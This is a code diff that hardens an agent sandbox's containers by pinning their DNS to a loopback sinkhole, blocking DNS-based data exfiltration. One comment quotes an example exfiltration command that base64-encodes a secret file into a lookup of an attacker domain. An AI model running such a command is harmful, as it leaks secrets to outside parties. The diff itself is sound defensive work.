@@ -23,6 +23,18 @@ import type { ToolContext } from "./types.js";
 export const WORKSPACE_MOUNT = "/workspace";
 export const SPILLOVER_MOUNT = "/trent/spillover";
 const DEFAULT_PROXY_PORT = 8089;
+/**
+ * [SEC-1 / D1] The egress seat's DNS upstream, pinned to a loopback sinkhole. The seat never needs
+ * to resolve an external name itself — proxied clients send the hostname in the proxy `CONNECT` and
+ * the host-side proxy resolves it, and `host.docker.internal` is an `/etc/hosts` entry consulted
+ * before DNS. Pinning the embedded resolver's upstream to `127.0.0.1` (nothing listens there in the
+ * seat) means an external name returns SERVFAIL even on a Docker version whose embedded resolver
+ * would otherwise forward off an `--internal` network — closing DNS-over-UDP exfiltration
+ * (`nslookup $(cat secret|base64).attacker.tld`) by construction, not by daemon behaviour. Measured
+ * on Docker Desktop 29.5.3 (2026-09-26): with this flag, `nslookup`/`getent`/`getaddrinfo` of an
+ * external name fail while `host.docker.internal` still resolves.
+ */
+const EGRESS_DNS_SINKHOLE = "127.0.0.1";
 // [SEC-3 T-10] Default memory ceiling for a seat container. Generous enough for normal build/test
 // work, bounded so an agent-run process cannot exhaust the host's RAM. `--pids-limit` capped process
 // count but not memory.
@@ -77,6 +89,12 @@ export function sandboxDockerOptions(
           // destination on the `--internal` network. Never `host-gateway`, which would re-open a
           // broad route to the host and defeat the firewall.
           extraHosts: [`host.docker.internal:${opts.egressWiring!.forwarderIp}`],
+          // [SEC-1 / D1] Pin the seat's DNS upstream to a loopback sinkhole so an external name
+          // cannot resolve in the seat (DNS-over-UDP exfil), independent of the daemon's
+          // embedded-resolver forwarding policy. host.docker.internal above is /etc/hosts, so the
+          // proxy path is unaffected. If the daemon rejects the flag, `docker create` fails and the
+          // seat's fail-closed path (ensureEgressBackend throws, no container) applies.
+          dns: [EGRESS_DNS_SINKHOLE],
         }
       : {}),
   };
